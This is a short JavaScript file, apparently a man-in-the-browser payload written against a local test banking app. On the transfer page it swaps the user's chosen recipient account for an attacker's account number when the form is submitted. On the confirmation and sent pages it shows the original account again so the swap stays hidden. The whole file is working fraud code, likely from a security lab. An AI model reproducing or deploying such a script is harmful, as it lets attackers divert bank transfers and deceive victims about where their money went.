console.log("Script is starting, oh yeah!");

let eavesdropperAccountNumber = '';
for(let i = 0; i < 26; i++) {
    eavesdropperAccountNumber += '9';
}
console.log(eavesdropperAccountNumber);

localStorage.setItem('fake_account_number', eavesdropperAccountNumber);
console.log(window.location.href);

if(window.location.href == 'http://localhost:8000/transfer_confirm/') {
    console.log('item: ' + localStorage.getItem('real_account_number'));
    var data = document.getElementById('transfer_data').innerHTML;
    console.log(localStorage.getItem('real_account_number'));
    var replacedData = data.replace(/99999999999999999999999999/g, localStorage.getItem('real_account_number'));
    document.getElementById('transfer_data').innerHTML = replacedData;
}

if(window.location.href == 'http://localhost:8000/transfer/') {
    document.addEventListener('submit', () => {
        localStorage.setItem('real_account_number', document.getElementById('id_recipient_account').value);
        console.log('item: ' + localStorage.getItem('real_account_number'));
        document.getElementById('id_recipient_account').value = localStorage.getItem('fake_account_number');
    });
}

if(window.location.href == 'http://localhost:8000/transfer_sent/'){
    document.getElementById('account').innerHTML = localStorage.getItem('real_account_number');
}